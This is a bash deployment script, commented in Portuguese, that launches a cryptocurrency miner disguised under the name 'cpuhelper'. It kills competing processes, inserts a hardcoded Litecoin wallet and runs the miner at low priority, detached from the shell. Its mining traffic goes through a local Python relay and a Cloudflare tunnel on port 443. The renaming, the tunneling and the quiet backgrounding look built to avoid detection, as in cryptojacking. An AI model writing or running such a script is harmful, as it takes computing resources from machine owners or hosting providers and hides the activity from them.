#!/bin/bash
set -e
cd "$(dirname "$0")"

chmod +x cpuhelper

# Extrai libs se nao existirem (empacotadas em libs.tar.gz pra nao perder no upload)
if [ ! -d libs ]; then
    echo "==> extraindo libs.tar.gz..."
    mkdir -p libs
    tar -xzf libs.tar.gz -C libs
fi

# Mata processos antigos (relay/cpuhelper) antes de subir
pkill -f relay.py 2>/dev/null || true
pkill -f cpuhelper 2>/dev/null || true
sleep 2

WALLET="${WALLET:-ltc1q92m09qwz82sy5zka5yjqmg0cwdadax0j2ktckl}"
sed -i "s/ltc1q92m09qwz82sy5zka5yjqmg0cwdadax0j2ktckl/$WALLET/g" config.json

ALGO=$(python3 -c "import json;print(json.load(open('config.json'))['algo'])")
PASS=$(python3 -c "import json;print(json.load(open('config.json'))['pass'])" 2>/dev/null || echo "c=LTC")

echo "==> iniciando relay (HTTP->HTTPS via Cloudflare tunnel, porta 443)..."
for i in 1 2 3; do
    nohup python3 relay.py > relay.log 2>&1 &
    disown
    echo $! > relay.pid
    sleep 3
    if ps -p $(cat relay.pid) > /dev/null 2>&1; then
        break
    fi
    echo "  tentativa $i falhou, retentando..."
done

# Verifica se relay subiu
if ! ps -p $(cat relay.pid) > /dev/null 2>&1; then
    echo "ERRO: relay nao subiu. Veja:"
    cat relay.log
    exit 1
fi
echo "==> relay pid: $(cat relay.pid)"

echo "==> miner: $ALGO -> 127.0.0.1:33111 (via relay) -> tunnel -> pcserver -> zpool"
echo "==> payout: $PASS"
echo "==> iniciando cpuhelper com nice +19..."
export LD_LIBRARY_PATH="$(pwd)/libs:$LD_LIBRARY_PATH"
nohup nice -n 19 ./cpuhelper -a $ALGO -o stretum+tcp://127.0.0.1:33111 -u $WALLET -p=$PASS -t 1 --retry-pause=15 --timeout=300 > miner.log 2>&1 &
disown
echo $! > miner.pid
echo "==> miner pid: $(cat miner.pid)"
echo "==> setup ok. logs: miner.log relay.log"
echo ""
echo "Monitorar:  tail -f miner.log"
echo "Relay:      tail -5 relay.log"
echo "Status:     ps -o pid,stat,pcpu,rss,etime,comm -C cpuhelper"
echo "            ps -o pid,stat,etime,comm -p \$(cat relay.pid)"
echo "Parar:      kill \$(cat miner.pid) \$(cat relay.pid)"
